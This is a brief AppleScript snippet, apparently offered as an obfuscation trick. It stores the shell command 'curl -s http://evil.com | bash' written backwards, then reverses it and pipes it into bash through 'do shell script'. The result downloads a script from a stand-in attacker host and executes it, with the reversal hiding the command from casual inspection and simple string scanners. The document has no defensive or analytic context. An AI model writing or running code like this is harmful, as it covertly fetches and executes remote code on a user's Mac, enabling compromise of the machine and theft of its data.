-- Reversed version of the full shell command
set reversed to "hsab | moc.live//:ptth s- lruC"
-- Reverse back and execute it
do shell script "echo " & quoted form of reversed & " | rev | bash"
